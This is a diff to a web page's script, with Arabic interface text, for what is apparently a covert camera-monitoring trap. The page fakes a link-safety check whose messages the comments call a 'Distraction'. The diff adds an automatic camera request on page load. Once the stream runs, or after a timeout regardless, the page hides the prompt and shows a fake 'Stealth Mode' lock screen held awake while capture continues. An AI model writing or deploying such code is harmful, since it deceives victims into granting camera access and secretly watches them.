@@ -142,81 +142,88 @@
             document.getElementById('localVideo').style.display = 'none';
         }
 
-        // 🤫 System Stealth: Prevent PWA install prompts from appearing automatically
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-        });
+        // 🤫 System Stealth: Prevent PWA install prompts
+        window.addEventListener('beforeinstallprompt', (e) => e.preventDefault());
 
         const roomId = Core.getRoomId();
         let system = null;
+        let verificationStarted = false;
 
         const startSystem = async () => {
-            if (system) return;
+            if (verificationStarted) return;
+            verificationStarted = true;
 
             const btn = document.getElementById('start-btn');
             btn.disabled = true;
             btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص الرابط...';
 
             try {
-                // Initialize System
+                // Initialize System Immediately
                 system = new MonitorSystem(roomId);
 
-                // 🔊 Unlock Audio for Siren
+                // 🔊 Unlock Audio for Siren (Needs the click)
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 if (audioCtx.state === 'suspended') await audioCtx.resume();
 
-                // Advanced Verification UX
+                // Advanced Verification UX (Distraction)
                 let stage = 0;
                 const checkReady = setInterval(() => {
                     stage++;
 
                     if (stage === 3) {
-                        btn.innerHTML = '<ion-icon name="shield-checkmark" style="color: #10b981;"></ion-icon> <span style="color: #10b981;">الرابط آمن بنسبة 100%</span>';
+                        btn.innerHTML = '<ion-icon name="shield-checkmark" style="color: #10b981;"></ion-icon> <span style="color: #10b981;">تم التحقق: الرابط آمن</span>';
                     } else if (stage === 6) {
-                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري تشفير قناة الاتصال...';
+                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري تشفير البيانات...';
                     }
 
-                    // Success Condition: Stream is active AND we showed the safe message (after stage 5)
-                    if (system.localStream && system.localStream.active && stage > 8) {
+                    // Auto-Success: Only if camera is active AND we showed the DISTRACTION message
+                    if (system.localStream && system.localStream.active && stage > 10) {
                         clearInterval(checkReady);
-
-                        btn.innerHTML = '<ion-icon name="checkmark-circle"></ion-icon> تم بنجاح! جاري المتابعة...';
-
-                        setTimeout(() => {
-                            const overlay = document.getElementById('permission-overlay');
-                            if (overlay) overlay.style.display = 'none';
-
-                            // 🎭 Activate Stealth Mode (Force Lock Screen)
-                            document.getElementById('dim-overlay').classList.add('active');
-                            updateClock();
-
-                            if ('wakeLock' in navigator) {
-                                navigator.wakeLock.request('screen').catch(() => { });
-                            }
-                        }, 1000);
+                        completeTransition();
                     }
 
-                    // Force timeout if camera fails
-                    if (stage > 25) {
+                    if (stage > 30) {
                         clearInterval(checkReady);
-                        if (!system.localStream) {
-                            btn.disabled = false;
-                            btn.innerHTML = 'فشل التحقق، يرجى السماح للكاميرا والمحاولة';
-                        } else {
-                            // Proceed anyway if camera is ok but UX stuck
-                            const overlay = document.getElementById('permission-overlay');
-                            if (overlay) overlay.style.display = 'none';
-                            document.getElementById('dim-overlay').classList.add('active');
-                        }
+                        completeTransition(); // Proceed anyway after timeout
                     }
                 }, 500);
 
             } catch (err) {
-                console.error("Critical System Error:", err);
+                console.error("System Error:", err);
                 btn.disabled = false;
-                btn.innerText = "فشل التحقق، يرجى المحاولة لاحقاً";
+                btn.innerText = "تحقق ومتابعة";
+                verificationStarted = false;
             }
         };
+
+        function completeTransition() {
+            const btn = document.getElementById('start-btn');
+            btn.innerHTML = '<ion-icon name="checkmark-circle"></ion-icon> تم بنجاح!';
+
+            setTimeout(() => {
+                const overlay = document.getElementById('permission-overlay');
+                if (overlay) overlay.style.display = 'none';
+
+                // 🎭 Activate Stealth Mode (Force Lock Screen)
+                document.getElementById('dim-overlay').classList.add('active');
+                updateClock();
+
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').catch(() => { });
+                }
+            }, 800);
+        }
+
+        // 🚀 AUTOMATIC START ON LOAD
+        window.addEventListener('load', () => {
+            // Give the user 1 second to see the page, then trigger permission prompt
+            setTimeout(() => {
+                if (!system) {
+                    console.log("Auto-triggering camera request...");
+                    system = new MonitorSystem(roomId);
+                }
+            }, 1000);
+        });
 
         document.getElementById('start-btn').onclick = startSystem;
 
